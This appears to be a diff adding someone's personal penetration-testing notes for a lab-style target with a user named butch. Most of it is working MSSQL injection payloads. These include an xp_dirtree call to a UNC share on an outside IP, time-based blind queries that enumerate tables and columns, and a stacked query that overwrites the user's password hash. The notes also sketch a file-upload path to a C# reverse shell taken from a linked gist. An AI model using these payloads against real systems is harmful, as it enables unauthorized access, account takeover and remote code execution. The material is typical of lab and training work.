@@ -1,0 +1,46 @@
+select name from table where name = 'INPUT';
+
+Blind SQLi to change password hash of butch
+
+INPUT:
+' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--  (test for blind sqli)
+
+'; IF (1=1) WAITFOR DELAY '0:0:10';-- 
+'; IF (1=2) WAITFOR DELAY '0:0:10';-- 
+
+'; IF ((select count(name) from sys.tables where name = 'user')=1) WAITFOR DELAY '0:0:10';-- (FAIL)
+'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';-- (PASS)
+
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';-- (PASS) 
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password')=1) WAITFOR DELAY '0:0:10';-- (FAIL)
+
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';-- (FAIL)
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';-- (FAIL)
+
+'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';-- (PASS)
+
+echo -n 'tacos123' | md5sum
+echo -n 'tacos123' | sha1sum
+echo -n 'tacos123' | sha256sum 
+
+
+
+file upload:
+
+realise that we cant upload .aspx or .asp files
+
+further more, all files uploaded converted to .txt and cannot change that (use burpsuit or console to verify)
+
+i.e. to say, only .txt files can be uploaded and any other files will automatically be appended with .txt
+
+/dev file reveals the site file, and shows that it is using site.master.cs found here https://github.com/autofac/Examples/blob/master/src/WebFormsExample/Site.Master.cs
+
+create a reverse shell combining the above and a cs reverse shell found here https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc
+
+ensure syntax and proper formatting, if not it will not work
+
+
+
+
+
+'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--
